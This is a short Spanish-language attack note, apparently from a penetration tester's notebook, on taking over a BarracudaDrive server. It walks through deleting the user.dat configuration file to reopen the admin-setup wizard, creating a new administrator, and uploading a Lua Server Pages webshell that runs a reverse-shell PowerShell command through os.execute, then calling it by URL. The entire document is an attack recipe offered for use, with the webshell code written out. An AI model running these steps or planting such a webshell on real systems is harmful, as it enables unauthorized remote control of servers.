# Info

Para realizar este ataque, necesitamos tener permisos de escritura en la carpeta de barracuda y sobre todos los archivos de la misma. Puede ser llamada barracudadrive o db en la carpeta C:

#### Proceso

- Podemos aprovechamos una vulnerabilidad que nos permite eliminar el archivo de configuración de los usuarios para obligar a barracuda a proporcionarnos el form de configuración del nuevo admin.
- cargamos un script en LUA con una shell reversa.
  
# ABUSO

### 1) Eliminación del user seteado

En la carpeta de la instalación eliminamos el archivo user.dat

### 2) Vamos al wizard de creación de usuario y seteamos el nuevo usuario.

    http://<dominio/ip>/Config-Wizard/wizard/SetAdmin.lsp

### 3) creamos el script en lua

El archivo tiene por extención **.lsp**

      <div style="margin-left:auto;margin-right: auto;width: 350px;">
      <div id="info">
      <h2>Lua Server Pages Reverse Shell</h2>
      <p>Delightful, isn't it?</p>
      </div>
      <?lsp if request:method() == "GET" then ?>
      <?lsp os.execute("shell base64 powershell") ?>
      <?lsp else ?>
      You sent a <?lsp=request:method()?> request
      <?lsp end ?>
      </div>

### 4) cargamos el script en la carpeta cmsdocs

    http://<ip/dominio>/fs/C/bd/cmsdocs/

### 5) Llamamos al script desde la carpeta root del servicio

    http://<ip/dominio>/shell.lsp
